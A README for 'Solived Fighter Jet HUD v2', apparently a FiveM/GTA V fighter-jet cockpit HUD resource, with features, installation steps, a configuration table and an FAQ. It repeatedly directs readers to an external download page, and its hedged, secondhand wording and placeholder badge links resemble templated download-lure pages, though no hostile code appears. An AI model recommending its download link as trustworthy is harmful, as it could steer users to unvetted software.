# Solived Fighter Jet HUD v2 - Game Script Utility 2026

> A fighter jet-inspired HUD for FiveM and GTA V vehicles, made to swap out the standard cockpit display for flight readouts, weapon reticles, and targeting feedback.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-FiveM-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/seanhall1992/jet-cockpit-hud-script?style=flat-square)](https://github.com/seanhall1992/jet-cockpit-hud-script)

---

<p align="center">
  <a href="https://seanhall1992.github.io/jet-cockpit-hud-script/">
    <img src="https://img.shields.io/badge/Download-Solived%20Fighter%20Jet%20HUD-brightgreen?style=for-the-badge" alt="Download Solived Fighter Jet HUD">
  </a>
</p>

> **[Direct Download - Solived Fighter Jet HUD](https://seanhall1992.github.io/jet-cockpit-hud-script/)**

---

[Download Latest Build](https://seanhall1992.github.io/jet-cockpit-hud-script/)

---

## Project Summary

Solived Fighter Jet HUD is a self-contained FiveM HUD resource that gives supported GTA V aircraft and related vehicles a cockpit display modeled after modern fighter jets. Instead of the native vehicle UI, it presents a flight-oriented interface with data such as speed, altitude, heading, pitch, roll, and flight path information.

Beyond flight telemetry, the script adds combat-focused indicators too. That includes weapon-specific reticles, a labeled weapon annunciator, lock and target distance displays, and an RWR-style warning scope with directional cues. The resource is built around configurable vehicle themes and alert logic, and the interface is powered with HTML, Lua, JavaScript, and Web Audio.

---

## What It Does

- Replaces the default GTA V cockpit HUD with a fighter jet-style layout
- Displays core flight data like speed, altitude, heading, pitch ladder, roll, and flight path marker
- Shows weapon-specific reticles and a weapon name annunciator
- Includes a lock and targeting system with distance readout
- Adds an RWR radar warning receiver scope with directional alerts
- Uses synthesized cockpit audio through the Web Audio API
- Works as a standalone FiveM resource with no ESX or QBCore dependency
- Supports vehicle-specific themes, warnings, and configuration options

---

## Installation

1. Download the latest build from the project link above.
2. Place the resource folder in your FiveM resources directory.
3. Keep the folder name consistent with your server setup, for example:
   `solived-fighterjet-hud-western-v2`
4. Add the resource to your server configuration and start it like any other FiveM resource.

Example:

ensure solived-fighterjet-hud-western-v2

If your server uses custom vehicle or weapon setups, review the configuration files before deployment so the HUD behavior matches your intended setup.

---

## Configuration

Most adjustments are handled through the resource's configuration files. Based on your server setup, you can tune vehicle themes, warning behavior, and the way the HUD is presented.

| Setting | Purpose | Notes |
|---|---|---|
| Vehicle theme selection | Matches the HUD to specific aircraft or vehicle styles | Configure per supported vehicle type |
| Warning behavior | Controls cockpit warning indications | Useful for custom combat setups |
| Weapon reticle mode | Chooses the active weapon display style | Tied to weapon-specific logic |
| Audio cues | Enables cockpit sound output | Powered by Web Audio |
| Targeting display | Shows lock state and distance | Useful for air-to-air or air-to-ground use |
| Interface layout | Adjusts HUD presentation details | Best tuned for your screen/UI preferences |

If you need to make changes, edit the provided HTML, JavaScript, or Lua-side configuration files according to your server's resource structure.

---

## Compatibility Notes

- Platform: FiveM
- Game context: GTA V vehicle HUD replacement
- Script type: Standalone resource
- Front-end stack: HTML, JavaScript, and Lua
- Audio: Web Audio API

Known limitations:
- Designed around supported vehicle and weapon contexts rather than every possible GTA V vehicle state
- Some features depend on the active aircraft, weapon, or targeting situation
- Visual behavior may vary if the resource is combined with other HUD or cockpit interface scripts

---

## FAQ

### How do I install it?
Download the resource, place it in your FiveM resources folder, then start it from your server configuration.

### Does it require ESX or QBCore?
No. The script is described as standalone.

### Can I customize the HUD?
Yes. Vehicle themes, warnings, and other presentation options are part of the configuration-oriented design.

### What files are used by the script?
The profile indicates HTML, JavaScript, Lua, and Web Audio are part of the implementation.

### Is it only for fighter jets?
It is centered on fighter jet-style cockpit HUD behavior, but it is also described as vehicle-specific, so compatibility depends on the vehicle and weapon setup.

### Where should I put the files?
Use a dedicated resource folder in your FiveM resources directory, then reference that folder name in your server start list.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
